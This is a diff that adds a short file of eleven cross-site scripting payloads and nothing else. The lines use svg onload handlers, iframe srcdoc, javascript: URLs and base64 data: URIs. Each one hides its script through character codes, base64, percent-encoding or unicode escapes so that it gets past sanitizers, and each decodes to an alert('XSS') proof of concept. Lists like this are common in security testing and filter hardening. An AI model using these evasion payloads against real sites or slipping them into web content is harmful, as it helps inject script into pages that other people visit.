@@ -1,0 +1,11 @@
+<svg onload='ev\u0061l(String.fromC\u0068arCode(97,108,101,114,116,40,39,88,83,83,39,41))'>
+<iframe srcdoc='<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>'></iframe>
+<iframe src="javascript:eval(atob('YWxlcnQoIlhTUyIp'))"></iframe>
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%27%58%53%53%27%29'))>"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<iframe srcdoc="<script>al\u0065rt('XSS')</script>"></iframe>
+<svg/onload="eval(atob('YWxlcnQoIlhTUyIp'))"></svg>
+<iframe src="javascript:al\u0065rt('XSS')"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"></iframe>
